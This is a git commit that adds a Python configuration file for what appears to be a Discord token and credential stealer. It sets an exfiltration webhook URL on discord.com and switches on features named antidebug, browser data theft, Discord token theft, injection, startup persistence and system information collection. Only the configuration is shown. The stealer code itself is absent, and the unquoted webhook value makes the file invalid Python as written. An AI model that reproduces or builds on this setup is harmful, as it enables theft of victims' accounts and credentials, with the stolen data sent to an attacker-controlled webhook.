38b1e481fa4dac255f90e35669213ab0653678ab
rrblu <124450592+rrblu@users.noreply.github.com>
2023-02-04 21:53:55 +0100

    Add files via upload

---
+++ src/config.py
@@ -0,0 +1,9 @@
+__CONFIG__ = {
+    'webhook' : https://discord.com/api/webhooks/1071435843614556251/rRnEydQSkQsvznjAryJjt3GmKCiAuAXEVtpeOZUhDNwORmXpcjGwUaWWDB4oEuTcF-9P,
+    'antidebug' : True,
+    'browsers' : True,
+    'discordtoken' : True,
+    'injection' : True,
+    'startup' : True,
+    'systeminfo' : True,
+}
